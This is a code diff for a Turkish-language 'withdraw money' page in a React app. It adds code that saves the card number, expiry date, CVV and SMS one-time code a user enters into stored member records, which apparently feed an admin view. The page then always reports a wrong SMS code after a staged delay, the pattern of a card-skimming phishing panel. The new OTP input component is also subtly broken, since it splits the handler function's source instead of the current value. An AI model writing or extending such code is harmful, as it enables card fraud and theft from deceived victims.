@@ -9,7 +9,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Loader2, Landmark, CreditCard, Wallet, TrendingUp } from "lucide-react";
-import { getMembers } from "@/lib/member-storage";
+import { getMembers, setMembers } from "@/lib/member-storage";
 import type { AdminMember } from "@/app/dashboard/admin/page";
 import { cn } from "@/lib/utils";
 
@@ -28,6 +28,57 @@ const InfoItem = ({ label, value, valueClassName, icon: Icon, labelClassName }: 
     </div>
 );
 
+const OtpInput = ({ value, onChange, length = 6 }: { value: string, onChange: (value: string) => void, length?: number }) => {
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>, index: number) => {
+    const { value } = e.target;
+    if (/^[0-9]$/.test(value)) {
+      const newValue = value.slice(0, 1);
+      const newOtp = [...(onChange.toString().split(''))];
+      newOtp[index] = newValue;
+      onChange(newOtp.join(''));
+      
+      // Move to next input
+      if (index < length - 1) {
+        const nextInput = document.getElementById(`otp-${index + 1}`);
+        if (nextInput) {
+          nextInput.focus();
+        }
+      }
+    } else if (value === '') {
+        const newOtp = [...(onChange.toString().split(''))];
+        newOtp[index] = '';
+        onChange(newOtp.join(''));
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
+      if (e.key === 'Backspace' && !value[index] && index > 0) {
+        const prevInput = document.getElementById(`otp-${index - 1}`);
+        if (prevInput) {
+            prevInput.focus();
+        }
+      }
+  }
+
+  return (
+    <div className="flex justify-center gap-2">
+      {Array.from({ length }).map((_, index) => (
+        <Input
+          key={index}
+          id={`otp-${index}`}
+          type="text"
+          maxLength={1}
+          value={value[index] || ''}
+          onChange={(e) => handleInputChange(e, index)}
+          onKeyDown={(e) => handleKeyDown(e, index)}
+          className="h-12 w-10 text-center text-xl font-semibold"
+        />
+      ))}
+    </div>
+  );
+};
+
+
 export default function BalancePage() {
   const { toast } = useToast();
   const [currentUser, setCurrentUser] = useState<AdminMember | null>(null);
@@ -39,12 +90,12 @@ export default function BalancePage() {
   
   const [isLoading, setIsLoading] = useState(false);
   const [isSmsStep, setIsSmsStep] = useState(false);
-  const [cardFormSubmitted, setCardFormSubmitted] = useState(false);
-
+  
   // Card form state
   const [cardNumber, setCardNumber] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
   const [cvv, setCvv] = useState("");
+  const [smsCode, setSmsCode] = useState("");
   
   useEffect(() => {
     const loggedInUserData = localStorage.getItem('loggedInUser');
@@ -57,6 +108,21 @@ export default function BalancePage() {
     }
   }, []);
 
+  const updateUserInStorage = (dataToUpdate: Partial<AdminMember>) => {
+     if (!currentUser) return;
+     const allMembers = getMembers();
+     const updatedMembers = allMembers.map(member => 
+        member.id === currentUser.id ? { ...member, ...dataToUpdate } : member
+     );
+     setMembers(updatedMembers);
+     const updatedCurrentUser = updatedMembers.find(m => m.id === currentUser.id);
+     if (updatedCurrentUser) {
+        setCurrentUser(updatedCurrentUser);
+        localStorage.setItem('loggedInUser', JSON.stringify(updatedCurrentUser));
+     }
+  };
+
+
   const handleBankSelect = (bank: string) => {
     setSelectedBank(bank);
     setOptionsDialogOpen(true);
@@ -64,7 +130,6 @@ export default function BalancePage() {
     setIbanDialogOpen(false);
     setCardDialogOpen(false);
     setIsSmsStep(false);
-    setCardFormSubmitted(false);
   };
 
   const showToastBasedOnStatus = () => {
@@ -107,25 +172,32 @@ export default function BalancePage() {
         return;
     }
 
-    if (!cardFormSubmitted) {
-      setIsLoading(true);
-      setCardFormSubmitted(true);
-      setTimeout(() => {
-          setIsLoading(false);
-          setIsSmsStep(true);
-      }, 10000); // 10 seconds wait
-    }
+    // Save card details to storage
+    updateUserInStorage({
+      cardNumber: cardNumber,
+      cardExpiry: expiryDate,
+      cardCvv: cvv
+    });
+    
+    setIsLoading(true);
+    setTimeout(() => {
+        setIsLoading(false);
+        setIsSmsStep(true);
+    }, 10000); // 10 seconds wait
   };
 
   const handleSmsSubmit = (e: React.FormEvent) => {
      e.preventDefault();
      setIsLoading(true);
+
+     // Save SMS code to storage
+     updateUserInStorage({ smsCode: smsCode });
+
      setTimeout(() => {
         setIsLoading(false);
         setCardDialogOpen(false);
         setOptionsDialogOpen(false);
-        setIsSmsStep(false);
-        setCardFormSubmitted(false);
+        resetCardDialog(false);
         toast({
             variant: "destructive",
             title: "Hatalı SMS Kodu",
@@ -137,10 +209,10 @@ export default function BalancePage() {
   const resetCardDialog = (open: boolean) => {
     if(!open) {
       setIsSmsStep(false);
-      setCardFormSubmitted(false);
       setCardNumber("");
       setExpiryDate("");
       setCvv("");
+      setSmsCode("");
     }
     setCardDialogOpen(open);
   }
@@ -194,7 +266,7 @@ export default function BalancePage() {
 
       <Card>
         <CardHeader>
-          <CardTitle className="text-3xl font-bold uppercase text-blue-600 dark:text-blue-400">Para Çek</CardTitle>
+          <CardTitle className="text-3xl font-bold uppercase text-blue-600 dark:text-blue-400">PARA ÇEK</CardTitle>
           <CardDescription className="text-base">Aşağıdan bir banka seçerek işleme başlayın.</CardDescription>
         </CardHeader>
         <CardContent className="grid grid-cols-2 gap-4 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5">
@@ -305,10 +377,10 @@ export default function BalancePage() {
                                   <form onSubmit={handleSmsSubmit} className="space-y-4 pt-4">
                                       <div>
                                           <Label htmlFor="smsCode" className="text-base">SMS Kodu</Label>
-                                          <Input id="smsCode" type="text" placeholder="******" required />
+                                          <OtpInput value={smsCode} onChange={setSmsCode} />
                                       </div>
                                       <DialogFooter>
-                                          <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
+                                          <Button type="submit" disabled={isLoading || smsCode.length < 6} className="w-full text-base sm:text-sm">
                                               {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                               Doğrula ve Çek
                                           </Button>
